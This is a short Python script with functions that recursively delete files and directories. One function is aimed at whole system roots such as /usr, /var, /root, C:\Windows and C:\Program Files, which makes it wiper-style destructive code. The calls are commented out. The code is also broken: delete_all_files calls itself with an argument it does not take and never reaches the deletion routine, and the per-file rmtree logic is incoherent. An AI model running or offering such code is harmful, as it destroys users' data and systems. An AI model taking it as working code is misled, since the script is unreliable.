import os
import shutil
import platform

import os
import shutil

def delete_files_and_parent_directories(directory):
    """Delete all files in the directory and the parent directory after each file deletion."""
    try:
        # Walk through the directory in reverse order (bottom-up) to handle directories last
        for dirpath, dirnames, filenames in os.walk(directory, topdown=False):
            # Delete all files in the directory
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    # Delete the file
                    os.remove(file_path)
                    print(f"Deleted file: {file_path}")
                    
                    try:
                        shutil.rmtree(dirpath)  # Deletes the directory and its contents (if any left)
                        print(f"Deleted directory: {dirpath}")
                    except Exception as e:
                        print(f"Error deleting parent directory {dirpath}: {e}")
                
                except Exception as e:
                    print(f"Error deleting file {file_path}: {e}")

    except Exception as e:
        print(f"Error with directory {directory}: {e}")


# delete_files_and_parent_directories('/Users/bariskaplan/Desktop/abc/')


def delete_all_files():
    # Determine the current operating system
    current_os = platform.system().lower()

    if current_os == "linux" or current_os == "darwin":
        # Linux or macOS
        root_dirs = ['/home', '/opt', '/var', '/usr', '/root', '/tmp']  
    elif current_os == "windows":
        # Windows
        root_dirs = ['C:\\Users', 'C:\\Program Files', 'C:\\Windows', 'C:\\Temp']  
    else:
        print("Unsupported OS.")
        return

    for root_dir in root_dirs:
        print(f"Deleting files in: {root_dir}")
        delete_all_files(root_dir)


# delete_all_files()
